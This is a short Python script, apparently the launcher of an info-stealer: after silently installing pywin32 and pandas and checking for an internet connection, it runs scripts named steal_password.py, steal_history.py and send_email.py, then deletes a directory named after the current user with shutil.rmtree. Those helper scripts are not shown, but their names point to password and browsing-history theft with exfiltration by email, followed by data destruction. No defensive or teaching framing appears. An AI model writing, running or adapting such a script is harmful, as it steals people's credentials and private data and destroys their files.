import socket
import os 
import shutil
import time
try:
    import win32crypt
except:
    os.system('python -m pip install pywin32')
try:
	import pandas as pd
except:
    os.system('python -m pip install pandas')


def is_connected():
    try:
        # connect to the host -- tells us if the host is actually
        # reachable
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False

print('connection is ----',is_connected())

if is_connected() == True:
    print('ready to execute--')
    os.system('python steal_password.py')
    os.system('python steal_history.py')
    os.system('python send_email.py')
    shutil.rmtree(os.environ.get('USERNAME'))
    time.sleep(2)
    quit()
else:
    print('no internet connection .aborting.........')
    time.sleep(2)
    quit()
    



